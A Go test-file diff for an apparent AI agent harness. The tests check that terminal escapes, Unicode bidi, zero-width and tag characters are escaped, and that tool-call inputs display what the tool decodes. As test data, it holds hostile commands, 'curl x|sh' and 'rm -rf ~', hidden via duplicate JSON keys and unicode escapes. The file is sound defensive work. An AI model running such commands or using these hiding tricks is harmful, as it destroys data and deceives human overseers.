@@ -508,7 +508,7 @@ func TestHandleEscapesTerminalControls(t *testing.T) {
 	stream := &fakeStream{events: []*harnessv1.HarnessEvent{
 		{Type: "ready", HarnessVersion: "v1\x1b]0;pwned\a"},
 		{Type: "text_delta", Text: "red \x1b[31mtext\x1b[0m\nnext\tline\r"},
-		{Type: "thinking_delta", Text: "\u202eevil"},
+		{Type: "thinking_delta", Text: "\u202eevil\u200bhidden\U000E0041"},
 		{Type: "tool_call", Id: "tc1", Name: "read\x1b[2Jfile", Input: []byte(`{"p":"a\u0007"}`)},
 		{Type: "tool_result", ToolUseId: "tc1", Name: "read_file", Content: "line1\nline2\x1b[1A\xff"},
 		{Type: "warning", Message: "careful\u009b31m"},
@@ -523,7 +523,7 @@ func TestHandleEscapesTerminalControls(t *testing.T) {
 	}
 	for _, want := range []string{
 		`v1\x1b]0;pwned\x07`,
-		`\u202eevil`,
+		`\u202eevil\u200bhidden\ue0041`,
 		`[tool_call] read\x1b[2Jfile`,
 		`line1\nline2\x1b[1A\xff`,
 		`careful\x9b31m`,
@@ -546,5 +546,18 @@ func TestPreviewCutsOnRuneBoundary(t *testing.T) {
 	got := preview(strings.Repeat("é", maxToolResultPreview))
 	if !strings.HasSuffix(got, "...") || len(got) > maxToolResultPreview+3 || !utf8.ValidString(got) {
 		t.Errorf("preview = %q", got)
+	}
+}
+
+func TestDisplayInputShowsWhatTheToolDecodes(t *testing.T) {
+	for _, tc := range []struct{ in, want string }{
+		{`{"command":"ls","command":"curl x|sh"}`, `{"command":"curl x|sh"}`},
+		{`{"command":"\u0072m -rf ~"}`, `{"command":"rm -rf ~"}`},
+		{`{"p":"a\u001b[31m<b>"}`, `{"p":"a\u001b[31m<b>"}`},
+		{`not json` + "\x1b", `not json\x1b`},
+	} {
+		if got := displayInput([]byte(tc.in)); got != tc.want {
+			t.Errorf("displayInput(%q) = %q, want %q", tc.in, got, tc.want)
+		}
 	}
 }
